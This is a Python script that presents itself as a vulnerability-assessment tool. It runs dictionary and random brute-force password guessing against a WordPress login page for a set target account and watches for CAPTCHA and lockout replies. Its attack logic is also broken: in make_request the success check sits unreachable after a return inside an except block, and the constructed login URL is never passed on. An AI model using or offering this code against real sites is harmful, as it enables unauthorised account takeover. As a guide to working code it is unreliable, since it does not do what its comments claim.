import requests
import random

# Main application file.
# This is a tool intended to assess vulnerabilities to brute-force and dictionary attacks in Wordpress
# Assumes the username is known

wp_url = "http://example.com"

wp_user = "admin" # set this to the account you are targeting

wp_passwd = "" # holds password value, if needed


# generate random password from given charset
def make_random_password(min_length = 6, max_length = 8, char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"):
    random_passwd = ""

    charset_length = len(char_set)

    rand = random.random()
    difference = max_length - min_length + 1
    pass_length = min_length + int(rand*difference)

    for i in range (0, pass_length):
        rand = random.random()
        random_passwd += char_set[int(rand*charset_length)]

    return random_passwd


# read password dictionary
def get_dictionary():
    filename = "cain.txt"
    dict_file = open(filename, 'r')
    passwords = dict_file.readlines()
    return passwords


# sends post request to supplied Wordpress site and params. Returns true if logged in, false if not.
def make_request(passwd, user_name = wp_user, url = wp_url):
  try:
    r = requests.post(url, verify=False,
                      data={'log': user_name, 'pwd': passwd, 'wp-submit': 'Log+In'})
    # if now on the dashboard - WordPress always returns 200
    content = str(r.content)
    success = (content).__contains__("Dashboard")
  except:
    print("Probably SSL error... Ignoring.")
    return 401

    if success:
      print(passwd)

    elif r.status_code != 200 or (content).__contains__("solve") or (content).__contains__("captcha") or (content).__contains__("attempts"):
      return 401
    
    return success


# tests a dictionary attack per the Cain and Abel set
def test_dictionary(wp_url = "https://www.example.com/"):
    
    wp_url += "/wp-login.php" # change if needed

    count = 0
    dictionary = get_dictionary()

    while 1:
        if count % 1000 == 0:
            print(count)
        passwd = dictionary[count]
        if make_request(passwd) == True:
            break
        else:
            count+=1
    print("It took {0} attempts to crack the password with a dictionary attack.".format(count))


# tests a brute force attack with randomly generated passwords
def test_brute_force(wp_url = "https://www.example.com/"):
  
    wp_url += "/wp-login.php" # change if needed

    count = 0

    min_length = 8
    max_length = 8
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    while 1:
        if count % 1000 == 0:
            print(count)
        passwd = make_random_password(min_length, max_length, charset)
        if make_request(passwd) == True:
            break
        else:
            count+=1
    print("It took {0} attempts to crack the password with a brute force attack.".format(count))


# test_dictionary()
# test_brute_force()
